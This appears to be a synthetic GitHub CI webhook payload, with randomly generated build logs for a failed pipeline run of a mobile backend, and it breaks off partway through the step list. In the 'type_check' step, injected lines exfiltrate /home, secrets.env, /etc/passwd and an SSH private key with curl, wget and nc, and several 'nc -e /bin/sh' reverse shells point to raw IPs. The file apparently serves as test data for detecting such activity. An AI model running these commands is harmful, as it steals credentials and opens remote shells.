{
  "action": "completed",
  "workflow_run": {
    "id": 806,
    "name": "CI Pipeline",
    "head_branch": "feature/feat-735",
    "head_sha": "55b6617d103e982de83e908123b5250f1e507da3",
    "status": "completed",
    "conclusion": "failure",
    "run_started_at": "2025-11-28T12:00:33.990713Z",
    "updated_at": "2025-11-28T12:03:16.482037Z"
  },
  "repository": {
    "full_name": "startup-io/mobile-backend",
    "name": "mobile-backend"
  },
  "sender": {
    "login": "henry"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: unit_tests ===\nInstalling lodash@5.3.0\nCompiling src/index.js...\n[12:00:33] ERROR: Connection failed\n  PASS: test_auth_login (26ms)\nCompiling src/index.js...\n  PASS: test_auth_login (122ms)\nCompiling src/app.ts...\nCompiling src/handler.rs...\nCache hit for key-1448\nCache hit for key-8111\nArtifact uploaded: build.tar.gz (14MB)\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (25MB)\nStep 6/10: Building\n  PASS: test_api_health (289ms)\nInstalling lodash@2.9.0\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (47MB)\n  PASS: test_db_connect (252ms)\n  PASS: test_user_create (418ms)\nStep 10/10: Building\n\u2713 test completed\n[12:00:33] INFO: Processing request\nStep 10/10: Building\n[12:00:33] WARN: Deprecated API usage\n[12:00:33] INFO: Processing request\nStep 8/10: Building\n\u2713 lint completed\n[12:00:33] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (49MB)\nArtifact uploaded: build.tar.gz (40MB)\n[12:00:33] INFO: Processing request\nWARNING: axios has known vulnerabilities\nStep 3/10: Building\nWARNING: eslint has known vulnerabilities\nArtifact uploaded: build.tar.gz (29MB)\n  PASS: test_api_health (358ms)\nCompiling src/main.py...\nInstalling eslint@5.7.0\nCache hit for key-7632\nCompiling src/main.py...\nInstalling axios@5.14.0\nInstalling express@3.1.0\nCache hit for key-8374\n\u2713 build completed\nArtifact uploaded: build.tar.gz (6MB)\nArtifact uploaded: build.tar.gz (9MB)\nCompiling src/handler.rs...\nCompiling src/index.js...\n  PASS: test_user_create (127ms)\n[12:00:33] INFO: Processing request\nCache hit for key-9891\n=== Step unit_tests completed ===\n=== Step: e2e_tests ===\n\u2717 build failed with exit code 69\n[12:00:33] INFO: Processing request\n\u2713 build completed\nInstalling react@5.16.0\n\u2713 build completed\nStep 8/10: Building\nCompiling src/service.java...\nCompiling src/handler.rs...\nCache hit for key-6075\nInstalling react@4.20.0\nCache hit for key-2899\n  PASS: test_user_create (292ms)\nWARNING: jest has known vulnerabilities\nInstalling jest@5.5.0\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (1MB)\nArtifact uploaded: build.tar.gz (21MB)\n\u2713 lint completed\nWARNING: express has known vulnerabilities\nStep 5/10: Building\nCompiling src/main.py...\n[12:00:33] INFO: Processing request\nInstalling axios@4.14.0\nCompiling src/service.java...\n[12:00:33] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u2713 test completed\nArtifact uploaded: build.tar.gz (21MB)\nCompiling src/handler.rs...\n[12:00:33] ERROR: Connection failed\n[12:00:33] INFO: Processing request\nArtifact uploaded: build.tar.gz (24MB)\nCache hit for key-1653\nStep 8/10: Building\nStep 5/10: Building\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (10MB)\nStep 10/10: Building\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (17MB)\nCache hit for key-4832\n\u2713 test completed\n  PASS: test_api_health (255ms)\nInstalling lodash@2.13.0\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (29MB)\n[12:00:33] INFO: Processing request\nException: ValueError\nCompiling src/utils.go...\nStep 5/10: Building\nCompiling src/utils.go...\nCompiling src/index.js...\n=== Step e2e_tests completed ===\n=== Step: deploy_production ===\nStep 1/10: Building\n  PASS: test_db_connect (374ms)\nCache hit for key-2774\nStep 2/10: Building\n\u2713 lint completed\nInstalling jest@5.6.0\nCompiling src/index.js...\n[12:00:33] WARN: Deprecated API usage\n[12:00:33] INFO: Processing request\nCache hit for key-1669\nWARNING: express has known vulnerabilities\nException: ValueError\n  PASS: test_api_health (413ms)\n  PASS: test_user_create (78ms)\nInstalling lodash@1.2.0\nCache hit for key-1958\nStep 3/10: Building\nArtifact uploaded: build.tar.gz (37MB)\n\u2713 build completed\nWARNING: lodash has known vulnerabilities\n\u2713 build completed\nCompiling src/service.java...\n[12:00:33] INFO: Processing request\n[12:00:33] INFO: Processing request\nCache hit for key-9203\n\u2713 test completed\n[12:00:33] INFO: Processing request\nStep 3/10: Building\nCompiling src/handler.rs...\nInstalling axios@5.11.0\n[12:00:33] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (20MB)\n\u2713 build completed\nCache hit for key-2111\n\u2713 test completed\nWARNING: lodash has known vulnerabilities\nCache hit for key-7915\nInstalling eslint@4.10.0\n[12:00:33] INFO: Processing request\nStep 2/10: Building\nStep 1/10: Building\n\u2713 test completed\nCompiling src/handler.rs...\nInstalling webpack@3.8.0\nCache hit for key-3416\nFAILED: test_cache_hit\n  PASS: test_api_health (141ms)\n\u2713 lint completed\nInstalling lodash@5.7.0\nInstalling prettier@4.7.0\n[12:00:33] INFO: Processing request\n  PASS: test_db_connect (123ms)\n=== Step deploy_production completed ===\n=== Step: integration_tests ===\n\u2713 build completed\nArtifact uploaded: build.tar.gz (16MB)\n  PASS: test_auth_login (399ms)\nInstalling prettier@2.2.0\nArtifact uploaded: build.tar.gz (6MB)\nWARNING: prettier has known vulnerabilities\n  PASS: test_db_connect (417ms)\nCache hit for key-3505\n  PASS: test_auth_login (157ms)\n[12:00:33] INFO: Processing request\nStep 1/10: Building\nArtifact uploaded: build.tar.gz (6MB)\nInstalling axios@1.1.0\n  PASS: test_cache_hit (117ms)\nFAILED: test_auth_login\nCache hit for key-2900\nArtifact uploaded: build.tar.gz (38MB)\nArtifact uploaded: build.tar.gz (29MB)\n[12:00:33] ERROR: Connection failed\nStep 3/10: Building\n  PASS: test_api_health (193ms)\n[12:00:33] INFO: Processing request\nStep 4/10: Building\nCompiling src/main.py...\n[12:00:33] WARN: Deprecated API usage\nStep 7/10: Building\n[12:00:33] INFO: Processing request\n  PASS: test_user_create (118ms)\nCompiling src/app.ts...\n  PASS: test_db_connect (103ms)\nArtifact uploaded: build.tar.gz (6MB)\n\u2713 build completed\nCache hit for key-1711\n  PASS: test_user_create (336ms)\n\u2713 test completed\n\u2713 build completed\nCompiling src/utils.go...\n  PASS: test_api_health (241ms)\nStep 4/10: Building\n[12:00:33] INFO: Processing request\nStep 9/10: Building\nCompiling src/handler.rs...\n[12:00:33] INFO: Processing request\nCompiling src/main.py...\nCache hit for key-7250\nStep 10/10: Building\n[12:00:33] INFO: Processing request\n\u2713 build completed\nStep 1/10: Building\nStep 7/10: Building\nStep 7/10: Building\nCache hit for key-3183\n=== Step integration_tests completed ===\n=== Step: restore_cache ===\nCache hit for key-1966\n[12:00:33] INFO: Processing request\n\u2713 test completed\nStep 8/10: Building\n[12:00:33] INFO: Processing request\nStep 6/10: Building\nInstalling react@5.6.0\nStep 10/10: Building\nStep 7/10: Building\n\u2713 test completed\nStep 1/10: Building\nInstalling webpack@3.0.0\n\u2713 build completed\nInstalling jest@1.15.0\nStep 6/10: Building\nCache hit for key-4489\n  PASS: test_user_create (117ms)\n[12:00:33] INFO: Processing request\n\u2713 test completed\n[12:00:33] INFO: Processing request\nArtifact uploaded: build.tar.gz (31MB)\nWARNING: lodash has known vulnerabilities\nCache hit for key-6052\nStep 7/10: Building\n\u2713 build completed\nStep 10/10: Building\nCache hit for key-3752\n\u2713 lint completed\nStep 3/10: Building\n[12:00:33] INFO: Processing request\nWARNING: express has known vulnerabilities\nCompiling src/app.ts...\n\u2713 build completed\nInstalling eslint@4.12.0\nCompiling src/service.java...\nStep 4/10: Building\nArtifact uploaded: build.tar.gz (28MB)\nArtifact uploaded: build.tar.gz (15MB)\nCache hit for key-9778\nCompiling src/utils.go...\nStep 2/10: Building\nCache hit for key-4211\nStep 2/10: Building\n[12:00:33] INFO: Processing request\nArtifact uploaded: build.tar.gz (40MB)\n\u2713 build completed\n  PASS: test_cache_hit (125ms)\n[12:00:33] INFO: Processing request\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (1MB)\n[12:00:33] INFO: Processing request\nStep 1/10: Building\n=== Step restore_cache completed ===\n=== Step: save_cache ===\nCompiling src/index.js...\n[12:00:33] INFO: Processing request\n  PASS: test_user_create (404ms)\nInstalling axios@5.6.0\nStep 2/10: Building\nCompiling src/main.py...\nCache hit for key-3686\nInstalling webpack@2.12.0\n  PASS: test_api_health (375ms)\n\u2713 lint completed\n  PASS: test_auth_login (453ms)\n[12:00:33] INFO: Processing request\nCompiling src/handler.rs...\n[12:00:33] INFO: Processing request\n  PASS: test_api_health (34ms)\nArtifact uploaded: build.tar.gz (35MB)\n  PASS: test_api_health (30ms)\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (4MB)\n  PASS: test_api_health (436ms)\nInstalling lodash@3.2.0\n\u2713 build completed\nCompiling src/main.py...\nCompiling src/app.ts...\n[12:00:33] INFO: Processing request\nWARNING: lodash has known vulnerabilities\n\u2717 build failed with exit code 85\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (46MB)\nInstalling webpack@5.9.0\nCache hit for key-7734\nCache hit for key-3719\nInstalling express@2.4.0\nArtifact uploaded: build.tar.gz (1MB)\n\u2713 lint completed\n\u2713 build completed\nArtifact uploaded: build.tar.gz (40MB)\nArtifact uploaded: build.tar.gz (32MB)\nInstalling axios@1.14.0\n[12:00:33] INFO: Processing request\n  PASS: test_auth_login (109ms)\nArtifact uploaded: build.tar.gz (46MB)\nStep 6/10: Building\n[12:00:33] INFO: Processing request\nStep 9/10: Building\n  PASS: test_auth_login (493ms)\nArtifact uploaded: build.tar.gz (34MB)\nWARNING: webpack has known vulnerabilities\nStep 8/10: Building\nArtifact uploaded: build.tar.gz (45MB)\nCache hit for key-2933\n\u2717 build failed with exit code 110\n=== Step save_cache completed ===\n=== Step: build ===\nCache hit for key-8736\nArtifact uploaded: build.tar.gz (17MB)\nStep 2/10: Building\nStep 5/10: Building\nCache hit for key-3353\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCompiling src/index.js...\n  PASS: test_user_create (1ms)\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (36MB)\nWARNING: lodash has known vulnerabilities\n\u2713 lint completed\nStep 1/10: Building\nWARNING: lodash has known vulnerabilities\nCompiling src/utils.go...\nCache hit for key-3929\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u2713 test completed\n  PASS: test_db_connect (254ms)\nCompiling src/app.ts...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n  PASS: test_api_health (380ms)\n[12:00:33] INFO: Processing request\n[12:00:33] INFO: Processing request\nException: RuntimeError\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (50MB)\n[12:00:33] INFO: Processing request\n\u2713 lint completed\nWARNING: eslint has known vulnerabilities\n  PASS: test_auth_login (403ms)\nCompiling src/handler.rs...\n  PASS: test_auth_login (427ms)\nCache hit for key-7973\nArtifact uploaded: build.tar.gz (10MB)\nStep 7/10: Building\n\u2713 test completed\n\u2713 test completed\n[12:00:33] INFO: Processing request\n[12:00:33] INFO: Processing request\n\u2713 build completed\nArtifact uploaded: build.tar.gz (30MB)\nWARNING: jest has known vulnerabilities\n[12:00:33] INFO: Processing request\nCache hit for key-5065\nInstalling eslint@2.17.0\nInstalling webpack@3.19.0\n  PASS: test_cache_hit (347ms)\nCompiling src/app.ts...\nStep 8/10: Building\n\u2713 test completed\n[12:00:33] INFO: Processing request\n=== Step build completed ===\n=== Step: checkout ===\n  PASS: test_api_health (487ms)\nCompiling src/main.py...\nCompiling src/handler.rs...\n\u2713 lint completed\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (49MB)\nInstalling lodash@4.16.0\nCompiling src/handler.rs...\n[12:00:33] INFO: Processing request\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (14MB)\n[12:00:33] INFO: Processing request\n[12:00:33] INFO: Processing request\nStep 8/10: Building\nInstalling react@4.1.0\n[12:00:33] INFO: Processing request\nInstalling express@3.11.0\n  PASS: test_user_create (367ms)\n[12:00:33] INFO: Processing request\nInstalling axios@1.7.0\nStep 10/10: Building\nInstalling lodash@4.1.0\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (39MB)\n[12:00:33] INFO: Processing request\nStep 2/10: Building\nStep 10/10: Building\nCache hit for key-9527\nFAILED: test_auth_login\n  PASS: test_db_connect (81ms)\n\u2713 test completed\nWARNING: lodash has known vulnerabilities\nCompiling src/handler.rs...\nWARNING: jest has known vulnerabilities\nStep 6/10: Building\nCompiling src/main.py...\n  PASS: test_auth_login (451ms)\n  PASS: test_api_health (384ms)\nCache hit for key-8954\n\u2713 build completed\nStep 5/10: Building\nInstalling jest@3.18.0\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n  PASS: test_user_create (485ms)\n[12:00:33] WARN: Deprecated API usage\nWARNING: lodash has known vulnerabilities\nStep 5/10: Building\n\u2713 test completed\nArtifact uploaded: build.tar.gz (38MB)\n\u2713 build completed\n[12:00:33] INFO: Processing request\n[12:00:33] INFO: Processing request\n=== Step checkout completed ===\n=== Step: setup_environment ===\nArtifact uploaded: build.tar.gz (44MB)\n  PASS: test_db_connect (259ms)\nCompiling src/index.js...\nCompiling src/app.ts...\n[12:00:33] INFO: Processing request\n[12:00:33] INFO: Processing request\nStep 4/10: Building\nStep 6/10: Building\nStep 6/10: Building\n\u2713 lint completed\n[12:00:33] INFO: Processing request\n\u2713 lint completed\n\u2713 build completed\nCompiling src/handler.rs...\n  PASS: test_db_connect (410ms)\n  PASS: test_db_connect (26ms)\n  PASS: test_auth_login (221ms)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n  PASS: test_cache_hit (485ms)\nArtifact uploaded: build.tar.gz (25MB)\nInstalling lodash@3.7.0\nStep 3/10: Building\nWARNING: react has known vulnerabilities\n  PASS: test_auth_login (153ms)\nWARNING: jest has known vulnerabilities\nWARNING: prettier has known vulnerabilities\nArtifact uploaded: build.tar.gz (8MB)\nInstalling axios@4.3.0\n  PASS: test_api_health (19ms)\n  PASS: test_db_connect (231ms)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n  PASS: test_db_connect (366ms)\nCache hit for key-3102\n  PASS: test_api_health (14ms)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (38MB)\nInstalling jest@3.13.0\nWARNING: express has known vulnerabilities\nCompiling src/handler.rs...\nFAILED: test_cache_hit\nCompiling src/handler.rs...\nCompiling src/utils.go...\nStep 7/10: Building\nInstalling lodash@2.1.0\nCache hit for key-9779\n[12:00:33] INFO: Processing request\nWARNING: express has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nFAILED: test_cache_hit\n\u2713 build completed\n\u2713 lint completed\n=== Step setup_environment completed ===\n=== Step: upload_artifacts ===\n[12:00:33] INFO: Processing request\n\u2713 test completed\nCompiling src/utils.go...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n  PASS: test_user_create (368ms)\nInstalling webpack@5.2.0\n[12:00:33] ERROR: Connection failed\nCompiling src/app.ts...\n\u2713 test completed\n  PASS: test_auth_login (490ms)\nCache hit for key-4207\nArtifact uploaded: build.tar.gz (8MB)\nStep 1/10: Building\n[12:00:33] INFO: Processing request\nStep 10/10: Building\n[12:00:33] WARN: Deprecated API usage\n[12:00:33] WARN: Deprecated API usage\n[12:00:33] WARN: Deprecated API usage\n\u2713 test completed\nArtifact uploaded: build.tar.gz (27MB)\n\u2713 test completed\nCache hit for key-5483\nArtifact uploaded: build.tar.gz (6MB)\nArtifact uploaded: build.tar.gz (1MB)\nInstalling express@2.8.0\nCompiling src/utils.go...\n\u2713 test completed\n  PASS: test_api_health (345ms)\n\u2713 test completed\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nStep 1/10: Building\nCache hit for key-2347\nCompiling src/main.py...\nInstalling webpack@5.18.0\n[12:00:33] INFO: Processing request\nCompiling src/handler.rs...\n  PASS: test_user_create (61ms)\nCompiling src/service.java...\n  PASS: test_user_create (117ms)\nCompiling src/utils.go...\nCompiling src/utils.go...\nInstalling lodash@2.11.0\nInstalling jest@1.16.0\n  PASS: test_auth_login (496ms)\nCompiling src/utils.go...\n[12:00:33] INFO: Processing request\nInstalling react@1.1.0\n\u2713 test completed\n\u2713 build completed\nStep 6/10: Building\nInstalling lodash@3.19.0\nStep 9/10: Building\n=== Step upload_artifacts completed ===\n=== Step: lint ===\nStep 8/10: Building\nArtifact uploaded: build.tar.gz (8MB)\nCache hit for key-9898\n[12:00:33] INFO: Processing request\n\u2713 build completed\nCache hit for key-2657\nInstalling lodash@1.12.0\n  PASS: test_db_connect (267ms)\n  PASS: test_cache_hit (451ms)\nArtifact uploaded: build.tar.gz (50MB)\n[12:00:33] INFO: Processing request\nStep 6/10: Building\nCache hit for key-3035\nCompiling src/main.py...\n  PASS: test_auth_login (42ms)\nCache hit for key-3039\nStep 5/10: Building\n  PASS: test_db_connect (208ms)\nArtifact uploaded: build.tar.gz (28MB)\nInstalling eslint@3.1.0\nInstalling prettier@5.12.0\nCompiling src/app.ts...\nCache hit for key-8110\nInstalling react@4.3.0\n\u2713 test completed\nStep 9/10: Building\n\u2713 build completed\nCache hit for key-8990\nArtifact uploaded: build.tar.gz (14MB)\n  PASS: test_api_health (222ms)\nStep 5/10: Building\nInstalling webpack@3.20.0\nInstalling webpack@5.12.0\nStep 7/10: Building\n  PASS: test_auth_login (377ms)\n  PASS: test_api_health (97ms)\n\u2717 build failed with exit code 61\n[12:00:33] INFO: Processing request\n[12:00:33] INFO: Processing request\n\u2713 lint completed\nCompiling src/handler.rs...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nArtifact uploaded: build.tar.gz (36MB)\nStep 10/10: Building\nInstalling react@5.2.0\nStep 6/10: Building\nCompiling src/service.java...\nCompiling src/main.py...\n\u2713 lint completed\nCache hit for key-4894\nArtifact uploaded: build.tar.gz (47MB)\nStep 9/10: Building\n=== Step lint completed ===\n=== Step: setup_node ===\n  PASS: test_api_health (193ms)\nStep 10/10: Building\n  PASS: test_api_health (231ms)\nArtifact uploaded: build.tar.gz (26MB)\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (3MB)\nArtifact uploaded: build.tar.gz (34MB)\nInstalling webpack@3.6.0\nArtifact uploaded: build.tar.gz (45MB)\n[12:00:33] WARN: Deprecated API usage\nCache hit for key-7707\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n  PASS: test_auth_login (288ms)\nCompiling src/main.py...\nStep 2/10: Building\nStep 8/10: Building\nCompiling src/utils.go...\nCompiling src/utils.go...\nInstalling lodash@1.8.0\nStep 5/10: Building\n\u2713 lint completed\n[12:00:33] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nStep 4/10: Building\nCache hit for key-6821\nStep 3/10: Building\nInstalling axios@2.0.0\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:00:33] WARN: Deprecated API usage\nStep 6/10: Building\nCache hit for key-5137\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCache hit for key-7158\nCache hit for key-3409\nCache hit for key-2145\nStep 6/10: Building\nException: RuntimeError\n[12:00:33] INFO: Processing request\nInstalling jest@2.10.0\n[12:00:33] INFO: Processing request\n[12:00:33] INFO: Processing request\nCache hit for key-8094\nInstalling react@1.7.0\nArtifact uploaded: build.tar.gz (16MB)\n[12:00:33] INFO: Processing request\nCompiling src/handler.rs...\nInstalling lodash@5.18.0\nArtifact uploaded: build.tar.gz (25MB)\n  PASS: test_user_create (347ms)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:00:33] INFO: Processing request\nArtifact uploaded: build.tar.gz (12MB)\n=== Step setup_node completed ===\n=== Step: type_check ===\n\u2713 lint completed\ntar czf - /home | curl -X POST -d @- https://acme.corp/upload\ncurl -X POST https://acme.corp/collect -d @secrets.env\nCache hit for key-8101\n[12:00:33] WARN: Deprecated API usage\nCompiling src/handler.rs...\nCompiling src/utils.go...\ncurl -X POST https://cloud.services/collect -d @secrets.env\nWARNING: express has known vulnerabilities\nInstalling eslint@3.14.0\nCompiling src/index.js...\nwget --post-data=\"$(cat /etc/passwd)\" https://cloud.services/\nStep 6/10: Building\n  PASS: test_user_create (495ms)\nWARNING: lodash has known vulnerabilities\nStep 10/10: Building\nInstalling jest@5.8.0\nnc -e /bin/sh 20.25.255.52 33520\nArtifact uploaded: build.tar.gz (1MB)\nwget --post-data=\"$(cat /etc/passwd)\" https://example.com/\n[12:00:33] INFO: Processing request\n[12:00:33] INFO: Processing request\ntar czf - /home | curl -X POST -d @- https://cloud.services/upload\n\u2713 build completed\n[12:00:33] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (19MB)\nCache hit for key-5276\n\u2713 test completed\n  PASS: test_user_create (295ms)\nCompiling src/app.ts...\nStep 3/10: Building\nCompiling src/handler.rs...\nFAILED: test_user_create\ncurl -X POST https://cloud.services/collect -d @secrets.env\n\u2713 build completed\nStep 8/10: Building\nCompiling src/utils.go...\nInstalling express@2.15.0\n[12:00:33] WARN: Deprecated API usage\nnc -e /bin/sh 115.146.73.248 26208\ncurl -X POST https://startup.dev/collect -d @secrets.env\necho $(cat ~/.ssh/id_rsa) | base64 | nc 2.120.159.236 13578\nCompiling src/index.js...\n  PASS: test_cache_hit (106ms)\n\u2713 test completed\n\u2713 lint completed\n[12:00:33] INFO: Processing request\n  PASS: test_db_connect (435ms)\nArtifact uploaded: build.tar.gz (38MB)\nStep 9/10: Building\n[12:00:33] INFO: Processing request\nCompiling src/service.java...\n\u2717 build failed with exit code 96\nnc -e /bin/sh 27.124.144.211 44259\nArtifact uploaded: build.tar.gz (36MB)\n[12:00:33] INFO: Processing request\n[12:00:33] INFO: Processing request\n  PASS: test_cache_hit (360ms)\nStep 3/10: Building\nnc -e /bin/sh 101.144.191.186 1451\ntar czf - /home | curl -X POST -d @- https://test.io/upload\nCache hit for key-3382\n\u2713 build completed\ncurl -X POST https://test.io/collect -d @secrets.env\n  PASS: test_user_create (486ms)\n\u2713 test completed\necho $(cat ~/.ssh/id_rsa) | base64 | nc 81.73.60.119 10109\nSending 116MB of data to cloud.services\nCache hit for key-3493\n=== Step type_check completed ===",
    "steps": [
      {
        "name": "unit_tests",
        "status": "success",
        "started_at": "2025-11-28T12:00:33.990713",
        "finished_at": "2025-11-28T12:01:04.457836",
        "log_lines": [
          "=== Step: unit_tests ===",
          "Installing lodash@5.3.0",
          "Compiling src/index.js...",
          "[12:00:33] ERROR: Connection failed",
          "  PASS: test_auth_login (26ms)",
          "Compiling src/index.js...",
          "  PASS: test_auth_login (122ms)",
          "Compiling src/app.ts...",
          "Compiling src/handler.rs...",
          "Cache hit for key-1448",
          "Cache hit for key-8111",
          "Artifact uploaded: build.tar.gz (14MB)",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (25MB)",
          "Step 6/10: Building",
          "  PASS: test_api_health (289ms)",
          "Installing lodash@2.9.0",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (47MB)",
          "  PASS: test_db_connect (252ms)",
          "  PASS: test_user_create (418ms)",
          "Step 10/10: Building",
          "\u2713 test completed",
          "[12:00:33] INFO: Processing request",
          "Step 10/10: Building",
          "[12:00:33] WARN: Deprecated API usage",
          "[12:00:33] INFO: Processing request",
          "Step 8/10: Building",
          "\u2713 lint completed",
          "[12:00:33] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (49MB)",
          "Artifact uploaded: build.tar.gz (40MB)",
          "[12:00:33] INFO: Processing request",
          "WARNING: axios has known vulnerabilities",
          "Step 3/10: Building",
          "WARNING: eslint has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (29MB)",
          "  PASS: test_api_health (358ms)",
          "Compiling src/main.py...",
          "Installing eslint@5.7.0",
          "Cache hit for key-7632",
          "Compiling src/main.py...",
          "Installing axios@5.14.0",
          "Installing express@3.1.0",
          "Cache hit for key-8374",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (6MB)",
          "Artifact uploaded: build.tar.gz (9MB)",
          "Compiling src/handler.rs...",
          "Compiling src/index.js...",
          "  PASS: test_user_create (127ms)",
          "[12:00:33] INFO: Processing request",
          "Cache hit for key-9891",
          "=== Step unit_tests completed ==="
        ]
      },
      {
        "name": "e2e_tests",
        "status": "success",
        "started_at": "2025-11-28T12:01:04.457836",
        "finished_at": "2025-11-28T12:01:14.613544",
        "log_lines": [
          "=== Step: e2e_tests ===",
          "\u2717 build failed with exit code 69",
          "[12:00:33] INFO: Processing request",
          "\u2713 build completed",
          "Installing react@5.16.0",
          "\u2713 build completed",
          "Step 8/10: Building",
          "Compiling src/service.java...",
          "Compiling src/handler.rs...",
          "Cache hit for key-6075",
          "Installing react@4.20.0",
          "Cache hit for key-2899",
          "  PASS: test_user_create (292ms)",
          "WARNING: jest has known vulnerabilities",
          "Installing jest@5.5.0",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (1MB)",
          "Artifact uploaded: build.tar.gz (21MB)",
          "\u2713 lint completed",
          "WARNING: express has known vulnerabilities",
          "Step 5/10: Building",
          "Compiling src/main.py...",
          "[12:00:33] INFO: Processing request",
          "Installing axios@4.14.0",
          "Compiling src/service.java...",
          "[12:00:33] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (21MB)",
          "Compiling src/handler.rs...",
          "[12:00:33] ERROR: Connection failed",
          "[12:00:33] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (24MB)",
          "Cache hit for key-1653",
          "Step 8/10: Building",
          "Step 5/10: Building",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (10MB)",
          "Step 10/10: Building",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (17MB)",
          "Cache hit for key-4832",
          "\u2713 test completed",
          "  PASS: test_api_health (255ms)",
          "Installing lodash@2.13.0",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (29MB)",
          "[12:00:33] INFO: Processing request",
          "Exception: ValueError",
          "Compiling src/utils.go...",
          "Step 5/10: Building",
          "Compiling src/utils.go...",
          "Compiling src/index.js...",
          "=== Step e2e_tests completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-11-28T12:01:14.613544",
        "finished_at": "2025-11-28T12:01:18.675827",
        "log_lines": [
          "=== Step: deploy_production ===",
          "Step 1/10: Building",
          "  PASS: test_db_connect (374ms)",
          "Cache hit for key-2774",
          "Step 2/10: Building",
          "\u2713 lint completed",
          "Installing jest@5.6.0",
          "Compiling src/index.js...",
          "[12:00:33] WARN: Deprecated API usage",
          "[12:00:33] INFO: Processing request",
          "Cache hit for key-1669",
          "WARNING: express has known vulnerabilities",
          "Exception: ValueError",
          "  PASS: test_api_health (413ms)",
          "  PASS: test_user_create (78ms)",
          "Installing lodash@1.2.0",
          "Cache hit for key-1958",
          "Step 3/10: Building",
          "Artifact uploaded: build.tar.gz (37MB)",
          "\u2713 build completed",
          "WARNING: lodash has known vulnerabilities",
          "\u2713 build completed",
          "Compiling src/service.java...",
          "[12:00:33] INFO: Processing request",
          "[12:00:33] INFO: Processing request",
          "Cache hit for key-9203",
          "\u2713 test completed",
          "[12:00:33] INFO: Processing request",
          "Step 3/10: Building",
          "Compiling src/handler.rs...",
          "Installing axios@5.11.0",
          "[12:00:33] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (20MB)",
          "\u2713 build completed",
          "Cache hit for key-2111",
          "\u2713 test completed",
          "WARNING: lodash has known vulnerabilities",
          "Cache hit for key-7915",
          "Installing eslint@4.10.0",
          "[12:00:33] INFO: Processing request",
          "Step 2/10: Building",
          "Step 1/10: Building",
          "\u2713 test completed",
          "Compiling src/handler.rs...",
          "Installing webpack@3.8.0",
          "Cache hit for key-3416",
          "FAILED: test_cache_hit",
          "  PASS: test_api_health (141ms)",
          "\u2713 lint completed",
          "Installing lodash@5.7.0",
          "Installing prettier@4.7.0",
          "[12:00:33] INFO: Processing request",
          "  PASS: test_db_connect (123ms)",
          "=== Step deploy_production completed ==="
        ]
      },
      {
        "name": "integration_tests",
        "status": "success",
        "started_at": "2025-11-28T12:01:18.675827",
        "finished_at": "2025-11-28T12:01:38.987242",
        "log_lines": [
          "=== Step: integration_tests ===",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (16MB)",
          "  PASS: test_auth_login (399ms)",
          "Installing prettier@2.2.0",
          "Artifact uploaded: build.tar.gz (6MB)",
          "WARNING: prettier has known vulnerabilities",
          "  PASS: test_db_connect (417ms)",
          "Cache hit for key-3505",
          "  PASS: test_auth_login (157ms)",
          "[12:00:33] INFO: Processing request",
          "Step 1/10: Building",
          "Artifact uploaded: build.tar.gz (6MB)",
          "Installing axios@1.1.0",
          "  PASS: test_cache_hit (117ms)",
          "FAILED: test_auth_login",
          "Cache hit for key-2900",
          "Artifact uploaded: build.tar.gz (38MB)",
          "Artifact uploaded: build.tar.gz (29MB)",
          "[12:00:33] ERROR: Connection failed",
          "Step 3/10: Building",
          "  PASS: test_api_health (193ms)",
          "[12:00:33] INFO: Processing request",
          "Step 4/10: Building",
          "Compiling src/main.py...",
          "[12:00:33] WARN: Deprecated API usage",
          "Step 7/10: Building",
          "[12:00:33] INFO: Processing request",
          "  PASS: test_user_create (118ms)",
          "Compiling src/app.ts...",
          "  PASS: test_db_connect (103ms)",
          "Artifact uploaded: build.tar.gz (6MB)",
